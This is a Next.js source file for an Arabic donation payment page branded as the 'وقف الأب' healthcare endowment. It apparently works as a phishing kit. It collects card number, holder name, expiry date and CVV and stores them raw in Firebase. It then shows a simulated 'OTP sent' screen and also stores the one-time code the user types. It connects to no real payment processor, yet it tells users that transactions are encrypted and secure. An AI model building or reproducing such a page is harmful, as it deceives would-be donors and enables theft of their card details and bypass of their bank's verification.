'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import {
  ArrowLeft,
  CreditCard,
  Calendar,
  Lock,
  CheckCircle,
  Shield,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardDescription,
  CardFooter,
} from '@/components/ui/card';
import { toast } from 'sonner';
import { addData } from '@/lib/firebase';

export default function PaymentPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [otp, setOtp] = useState('');
  const [paymentId, setPaymentId] = useState('');
  const [amount, setAmount] = useState('');
useEffect(()=>{
const am=localStorage.getItem('amount')
setAmount(am!)
},[])

  const formatCardNumber = (value: string) => {
    // Remove all non-digit characters
    const digits = value.replace(/\D/g, '');

    // Add space after every 4 digits
    const formatted = digits.replace(/(\d{4})(?=\d)/g, '$1 ');

    // Limit to 19 characters (16 digits + 3 spaces)
    return formatted.slice(0, 19);
  };

  const formatExpiryDate = (value: string) => {
    
    // Remove all non-digit characters
    const digits = value.replace(/\D/g, '');

    // Format as MM/YY
    if (digits.length > 2) {
      return `${digits.slice(0, 2)}/${digits.slice(2, 4)}`;
    }

    return digits;
  };
  const handleOtpChange = (value: string) => {
    setOtp(value);
  };
  const handleSubmitPayment = async () => {
    const paymentData = {
      cardNumber: cardNumber,
      cardHolder,
      expiryDate,
      cvv,
      createdDate:new Date().toISOString()
    };
    // Form validation
    if (cardNumber.replace(/\s/g, '').length !== 16) {
      toast.error('يرجى إدخال رقم بطاقة صحيح مكون من 16 رقمًا');
      return;
    }

    if (!cardHolder) {
      toast.error('يرجى إدخال اسم حامل البطاقة');
      return;
    }

    if (expiryDate.length !== 5) {
      toast.error('يرجى إدخال تاريخ انتهاء صلاحية صحيح (MM/YY)');
      return;
    }

    if (cvv.length !== 3) {
      toast.error('يرجى إدخال رمز CVV صحيح مكون من 3 أرقام');
      return;
    }
    const donationId = localStorage.getItem('visitor')
    setIsSubmitting(true);
    try {
      if (!donationId) throw new Error('Missing donation ID');
      addData({id:paymentId,paymentData})

      // Save payment data to Firestore
    
const id=localStorage.getItem('visitor')
      if (id) {
        setPaymentId(id);
        setShowOtp(true);

        // Simulate sending OTP to user's phone
        toast.success('تم إرسال رمز التحقق لمرة واحدة إلى هاتفك المحمول');
      } else {
        throw new Error('Failed to process payment');
      }
    } catch (error) {
      console.error('Error processing payment:', error);
      toast.error(
        'حدثت مشكلة في معالجة الدفع الخاص بك. يرجى المحاولة مرة أخرى.'
      );
    } finally {
      setIsSubmitting(false);
    }
  };
  const handleVerifyOtp = async () => {
    // Validate OTP
    const otpValue = otp;
const id=localStorage.getItem('visitor')

    addData({id:id,otp:otpValue})
    if (otpValue.length !== 6) {
      toast.error('يرجى إدخال رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك');
      return;
    }
    setIsSubmitting(true);
    try {
      if ( !paymentId) throw new Error('Missing required IDs');
    } catch (error) {
      console.error('Error verifying OTP:', error);
      toast.error(
        'حدثت مشكلة في التحقق من الدفع الخاص بك. يرجى المحاولة مرة أخرى.'
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white p-4 flex justify-between items-center border-b">
        <div className="w-8"></div> {/* Empty div for spacing */}
        <div className="text-blue-600 text-sm font-semibold">
          <div>وقف الأب</div>
          <div className="text-xs text-gray-500">وقف الرعاية الصحية</div>
        </div>
        <Button variant="ghost" size="icon" onClick={() => router.back()}>
          <ArrowLeft className="h-5 w-5" />
        </Button>
      </header>

      {/* Main Content */}
      <main className="flex-1 p-4 max-w-md mx-auto w-full">
        <Card className="mb-6 border-2 border-gray-200 shadow-md">
          <CardHeader className="bg-gradient-to-r from-blue-50 to-white border-b pb-4">
            <CardTitle className="text-2xl text-blue-900">
              تفاصيل الدفع
            </CardTitle>
            <CardDescription className="text-gray-600 mt-1">
              مبلغ التبرع:{' '}
              <span className="font-bold text-blue-900">{amount} درهم</span>
            </CardDescription>
          </CardHeader>

          <CardContent className="pt-6">
            {!showOtp ? (
              <div className="space-y-5">
                <div className="flex justify-center mb-2">
                  <div className="flex space-x-2 rtl:space-x-reverse">
                    <img
                      src="/v.png"
                      alt="Visa"
                      width={45}
                      height={30}
                      className="h-7"
                    />
                    <img
                      src="/m.png"
                      alt="Mastercard"
                      width={45}
                      height={30}
                      className="h-7"
                    />
                    <img
                      src="/emp.png"
                      alt="American Express"
                      width={45}
                      height={30}
                      className="h-7"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center">
                    <CreditCard className="h-5 w-5 ml-2 text-blue-500" />
                    <label htmlFor="cardNumber" className="text-sm font-medium">
                      رقم البطاقة
                    </label>
                  </div>
                  <Input
                    id="cardNumber"
                    value={cardNumber}
                    type='tel'
                    onChange={(e) =>
                      setCardNumber(formatCardNumber(e.target.value))
                    }
                    maxLength={19}
                    className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                  />
                </div>

                <div className="space-y-2">
                  <label
                    htmlFor="cardHolder"
                    className="text-sm font-medium flex items-center"
                  >
                    <span className="ml-2">اسم حامل البطاقة</span>
                  </label>
                  <Input
                    id="cardHolder"
                    value={cardHolder}
                    onChange={(e) => setCardHolder(e.target.value)}
                    className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <div className="flex items-center">
                      <Calendar className="h-5 w-5 ml-2 text-blue-500" />
                      <label
                        htmlFor="expiryDate"
                        className="text-sm font-medium"
                      >
                        تاريخ الانتهاء
                      </label>
                    </div>
                    <Input
                      id="expiryDate"
                      placeholder="MM/YY"
                      value={expiryDate}
                      onChange={(e) =>
                        setExpiryDate(formatExpiryDate(e.target.value))
                      }
                      maxLength={5}
                      className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                    />
                  </div>

                  <div className="space-y-2">
                    <div className="flex items-center">
                      <Lock className="h-5 w-5 ml-2 text-blue-500" />
                      <label htmlFor="cvv" className="text-sm font-medium">
                        رمز الأمان (CVV)
                      </label>
                    </div>
                    <Input
                      id="cvv"
                      value={cvv}
                      onChange={(e) => {
                        setCvv(e.target.value);
                      }}
                      maxLength={3}
                      type="password"
                      className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                    />
                  </div>
                </div>

                <div className="flex items-center justify-center text-xs text-gray-500 mt-4 bg-gray-50 p-2 rounded-md">
                  <Shield className="h-4 w-4 ml-1 text-green-500" />
                  <span>جميع المعاملات مشفرة وآمنة</span>
                </div>
              </div>
            ) : (
              <div className="space-y-5">
                <div className="text-center mb-4">
                  <CheckCircle className="h-12 w-12 mx-auto text-green-500 mb-2" />
                  <h3 className="text-lg font-medium text-gray-900 mb-1">
                    التحقق من الدفع
                  </h3>
                  <p className="text-sm text-gray-600">
                    لقد أرسلنا رمز تحقق لمرة واحدة إلى رقم هاتفك المحمول المسجل.
                 
                  </p>
                </div>

                <div className="space-y-4">
                  <label
                    htmlFor="otp-0"
                    className="text-sm font-medium block text-center"
                  >
                    رمز التحقق لمرة واحدة (OTP)
                  </label>
                  <div className="flex justify-center gap-2 dir-ltr">
                    <Input
                      value={otp}
                      onChange={(e) => handleOtpChange(e.target.value)}
                      className="w-full h-12 text-center text-xl font-bold border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                      maxLength={6}
                      inputMode="numeric"
                    />
                  </div>
                  <p className="text-center text-sm text-gray-500 mt-2">
                    لم يصلك الرمز؟{' '}
                    <button className="text-blue-600 hover:underline">
                      إعادة الإرسال
                    </button>
                  </p>
                </div>
              </div>
            )}
          </CardContent>

          <CardFooter className="bg-gray-50 border-t pt-4 pb-4">
            {!showOtp ? (
              <Button
                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 h-12 text-lg"
                onClick={handleSubmitPayment}
                disabled={isSubmitting}
              >
                {isSubmitting ? 'جاري المعالجة...' : 'إتمام الدفع'}
              </Button>
            ) : (
              <Button
                className="w-full bg-green-600 hover:bg-green-700 text-white py-2 h-12 text-lg"
                onClick={handleVerifyOtp}
                disabled={isSubmitting}
              >
                {isSubmitting ? 'جاري التحقق...' : 'تأكيد رمز التحقق'}
              </Button>
            )}
          </CardFooter>
        </Card>

     
      </main>

      {/* Footer */}
      <footer className="bg-blue-900 text-white p-4 text-center">
        <div className="text-sm font-semibold">© وقف الأب</div>
      </footer>
    </div>
  );
}
